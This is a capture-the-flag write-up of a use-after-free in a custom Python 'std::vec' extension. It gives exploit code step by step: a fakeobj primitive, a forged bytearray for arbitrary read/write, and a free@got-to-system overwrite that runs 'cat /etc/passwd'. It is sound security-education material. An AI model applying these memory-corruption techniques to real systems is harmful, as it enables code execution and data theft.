# TSG CTF 2020 - std::vec
In TSG CTF 2020 I got first blood on a challenge called `std::vec`. It was quite simple but the overall 'feel' of the challenge was very neat. Shout out to [moratorium08](https://twitter.com/moratorium08), the author of this challenge!

# Vulnerability
The vulnerability is easy to spot, as it is already introduced in other challenges. A very similar bug exists in [this challenge](https://github.com/pr0cf5/CTF-writeups/tree/master/2019/fbctf/babylist) from facebook ctf 2019. Basically, it occurs because the private fields of a `std::vector` is copied to another structure. When a `std::vector` is expanded, the original backing memory is freed. Therefore, the private fields copied to another location becomes a dangling pointer. Reading/writing from that pointer triggers uaf.

# Exploitation - Triggering the bug
```python
victim = stdvec.StdVec()
for i in range(0x100):
    victim.append(0)
victim_iter = iter(victim)

# deallocate the back of iter1
for i in range(0x1000):
    victim.append(0)

obj = next(victim_iter)
```

In this POC, `victim_iter` is a variable that contains the freed pointers. In the first loop, the victim vector is expanded to accomodate 0x100 entries, which is equivalent to 0x800 bytes since each entry is a `PyObject *` and `sizeof(PyObject *) = 8`. Afterwards the iterator is extracted from the vector. 


In the second loop, the vector is expanded to 0x8000 bytes and the original backing memory is freed. Therefore the pointers in `victim_iter` become dangling pointers. In the last line, 8 byte read from freed memory occurs. This causes a crash.

The following code causes a crash at a specific address.

```python
victim = stdvec.StdVec()

for i in range(0x100):
    victim.append(0)

victim_iter = iter(victim)

# deallocate the back of iter1
for i in range(0x1000):
    victim.append(0)

reclaim = bytearray(0x800)
reclaim[0:8] = p64_bytearray(0xdeadbeef)

obj = next(victim_iter)
```

This causes a crash because the `reclaim` bytearray reclaims the 0x800 bytes used in `victim_iter`. The first 8 bytes of the reclaimed memory becomes 0xdeadbeef, so `next(victim_iter)` returns (PyObject *)0xdeadbeef. However when returning a `PyObject` it increments the refcount by 1, and this write access causes a crash. 

Now we can construct the `fakeobj` primitive based on this POC.
```python
def fakeobj(address):
    victim = stdvec.StdVec()

    for i in range(0x100):
        victim.append(0)

    victim_iter = iter(victim)

    # deallocate the back of iter1
    for i in range(0x1000):
        victim.append(0)

    reclaim = bytearray(0x800)
    reclaim[0:8] = p64_bytearray(address)

    obj = next(victim_iter)
    return obj
```

Basically the `fakeobj` function converts an address into a python object. If the contents in that address is well controlled we can forge an arbitrarty python object which is an extremely powerful primitive.

A way to put controlled data at a known address is to use python `bytes`. In `bytes` the content is inlined in the structure at offset 0x20. This can be seen in the following definition. (Although I figured this out intuitively by looking at gdb during the ctf)

```c
typedef struct {
    PyObject_VAR_HEAD
    Py_hash_t ob_shash;
    char ob_sval[1];

    /* Invariants:
     *     ob_sval contains space for 'ob_size+1' elements.
     *     ob_sval[ob_size] == 0.
     *     ob_shash is the hash of the string or -1 if not computed yet.
     */
} PyBytesObject;
```

Therefore, by providing `id(bytes_object) + 0x20` to `fakeobj` we can forge an arbitrary python object.

# Exploiitation - getting arbitrary write
To get arbitrary write, we forge a bytearray object with a user controlled backing vector pointer. The structure of a bytearray is the following.

```c
struct PyByteArrayObject {
    int64_t ob_refcnt;   /* can be basically any value we want */
    struct _typeobject *ob_type; /* points to the bytearray type object */
    int64_t ob_size;     /* Number of items in variable part */
    int64_t ob_alloc;    /* How many bytes allocated in ob_bytes */
    char *ob_bytes;      /* Physical backing buffer */
    char *ob_start;      /* Logical start inside ob_bytes */
    int32_t ob_exports;  /* Not exactly sure what this does, we can ignore it */
}
```

By controlling `ob_bytes` and `ob_start` we can read/write at arbitrary addresses. The following code implements the foring of a bytearray.

```python
string = p64(0xff)+p64(id(type(bytearray(0))+p64(0x100)+p64(0x100)+p64(someaddr)*2
faked = fakeobj(id(string) + 0x20)
```

Also, since we want to obtain arbitrary read/writes multiple times, we use the following strategy. We first create a slave bytearray. Then, we forge a master bytearray using `fakeobj`. The master bytearray's `ob_bytes` points to the address of slave, so writing to master alters the structure of slave. Therefore we can set the write address by writing at offset 0x20 of master, and writing to slave afterwards. The following code implements this.

```python
def arbitrary_write(address, value):
	master[0x20:0x28] = p64_bytearray(address)
	master[0x28:0x30] = p64_bytearray(address)
	slave[0:0x8] = p64_bytearray(value)
```

# Final
Now we can write an exploit by glueing all of the primitives above. However, there are a few issues to resolve.

First, we can't use the functions `iter` and `next` because all builtins are removed. Therefore, we replace the code with the following code.

```python
counter = 0
for x in victim:
	# this frees the back of the current iterator
	for j in range(0x1000):
		victim.append(0)
	reclaim = bytearray(0x800)
	reclaim[0x8:0x10] = p64_bytearray(address)
	if counter == 1:
		return x
	counter += 1
```

Basically it is an implementation that doesn't use `iter` and `next` and uses the internals of forloops. 

Second, we can't use the `type` function for the same reason in 1. However, since there is no PIE in the python binary and the type object is located in the data section of the binary, the `type` object is always located at the same address. Therefore we can print the id of `type(bytearray(0)` locally and use it for the exploit. I found it was 10595392.

Lastly, we need to find a function pointer to overwrite. I used `free@got` for this. To free something whose contents we can control, I hand-fuzzed various methods and figured out that printing a string frees it. So, `print("cat /etc/passwd")` triggers `system("cat /etc/passwd")` if we overwrite `free@got` with `system`.

[This](./exploit.py) is my final exploit. I hope it is a good reference for others.